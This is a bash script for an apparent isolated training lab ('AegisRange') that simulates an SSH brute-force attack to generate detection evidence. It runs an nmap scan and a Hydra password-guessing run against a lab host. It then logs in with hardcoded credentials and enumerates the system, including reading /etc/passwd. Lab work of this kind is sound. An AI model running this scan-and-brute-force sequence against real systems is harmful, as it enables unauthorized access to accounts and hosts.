#!/bin/bash
# ============================================================================
# AegisRange — Scenario 1: SSH Credential Testing (Brute-Force Simulation)
# ============================================================================
# EDUCATIONAL USE ONLY — Run exclusively in the AegisRange isolated lab.
#
# This script automates the full attack scenario:
#   Phase 1: Target reconnaissance with Nmap
#   Phase 2: SSH credential testing with Hydra
#   Phase 3: Post-authentication enumeration
#
# Prerequisites:
#   - Run from aegis-kali (10.10.10.10)
#   - aegis-linux (10.10.10.20) must be running with SSH enabled
#   - Tools: nmap, hydra, sshpass
# ============================================================================

set -euo pipefail

# --- Configuration ---
TARGET="10.10.10.20"
ATTACKER_IP="$(ip -4 -o addr show 2>/dev/null | awk '/10\.10\.10\./ {split($4,a,"/"); print a[1]; exit}')"
ATTACKER_IP="${ATTACKER_IP:-10.10.10.10}"
TARGET_USER="labuser"
TARGET_PASS="labpass123"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORDLIST="${SCRIPT_DIR}/wordlist.txt"
LOG_DIR="/opt/aegisrange/logs/scenario1"
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"

# --- Setup ---
mkdir -p "${LOG_DIR}"

echo "============================================"
echo "  AegisRange — Scenario 1: SSH Credential Testing"
echo "  Target : ${TARGET}"
echo "  User   : ${TARGET_USER}"
echo "  Time   : $(date)"
echo "============================================"
echo ""

# --- Pre-flight check ---
echo "[*] Pre-flight: Checking target is reachable..."
if ! ping -c 1 -W 3 "${TARGET}" > /dev/null 2>&1; then
    echo "[-] ERROR: Target ${TARGET} is not reachable. Is the VM running?"
    exit 1
fi
echo "[+] Target is reachable."
echo ""

# ============================================================================
# Phase 1: Reconnaissance
# ============================================================================
echo "===== Phase 1: Reconnaissance ====="
echo "[*] Running Nmap service version scan on common ports..."
nmap -sV -p 22,21,80 "${TARGET}" -oN "${LOG_DIR}/nmap_scan_${TIMESTAMP}.txt" 2>&1 | tail -n +2
echo ""
echo "[+] Nmap scan saved to: ${LOG_DIR}/nmap_scan_${TIMESTAMP}.txt"
echo ""

sleep 2

# ============================================================================
# Phase 2: Credential Testing
# ============================================================================
echo "===== Phase 2: SSH Credential Testing ====="
echo "[*] Using Hydra with wordlist: ${WORDLIST}"
echo "[*] Wordlist contains $(wc -l < "${WORDLIST}") entries"
echo "[*] Target user: ${TARGET_USER}"
echo "[*] Starting credential testing (this will generate auth.log entries)..."
echo ""

# Run Hydra — the -V flag shows each attempt for visibility
# The || true prevents script exit on Hydra's non-zero return codes
hydra -l "${TARGET_USER}" \
      -P "${WORDLIST}" \
      "ssh://${TARGET}" \
      -t 4 \
      -V \
      -o "${LOG_DIR}/hydra_results_${TIMESTAMP}.txt" \
      2>&1 || true

echo ""
echo "[+] Credential testing complete."
echo "[+] Results saved to: ${LOG_DIR}/hydra_results_${TIMESTAMP}.txt"
echo ""

sleep 2

# ============================================================================
# Phase 3: Post-Authentication Enumeration
# ============================================================================
echo "===== Phase 3: Post-Authentication Enumeration ====="
echo "[*] Logging in with discovered credentials..."
echo "[*] Running enumeration commands to generate audit trail..."
echo ""

# Check if sshpass is available
if ! command -v sshpass &> /dev/null; then
    echo "[-] sshpass not installed. Install with: apt-get install -y sshpass"
    echo "[-] Skipping post-authentication phase."
    echo ""
else
    sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no \
        "${TARGET_USER}@${TARGET}" \
        'echo "=== System Info ===" && uname -a && echo "" &&
         echo "=== Current User ===" && whoami && id && echo "" &&
         echo "=== User Accounts ===" && cat /etc/passwd && echo "" &&
         echo "=== Network Configuration ===" && ip addr && echo "" &&
         echo "=== Listening Services ===" && ss -tlnp 2>/dev/null && echo "" &&
         echo "=== Running Processes (top 20) ===" && ps aux | head -20' \
        2>&1 | tee "${LOG_DIR}/post_auth_enum_${TIMESTAMP}.txt"

    echo ""
    echo "[+] Enumeration output saved to: ${LOG_DIR}/post_auth_enum_${TIMESTAMP}.txt"
fi

# ============================================================================
# Summary
# ============================================================================
echo ""
echo "============================================"
echo "  Scenario 1 Complete!"
echo "============================================"
echo ""
echo "  Evidence to check:"
echo "    Linux target  : /var/log/auth.log (failed + successful SSH logins)"
echo "    Linux target  : /var/log/audit/audit.log (command execution)"
echo "    Aegis backend : GET /api/incidents?source_ip=${ATTACKER_IP}"
echo "    Aegis dashboard: Incident \"Suspicious activity from ${ATTACKER_IP}\" (http://localhost:8501)"
echo ""
echo "  Log files from this run:"
echo "    ${LOG_DIR}/nmap_scan_${TIMESTAMP}.txt"
echo "    ${LOG_DIR}/hydra_results_${TIMESTAMP}.txt"
echo "    ${LOG_DIR}/post_auth_enum_${TIMESTAMP}.txt"
echo ""
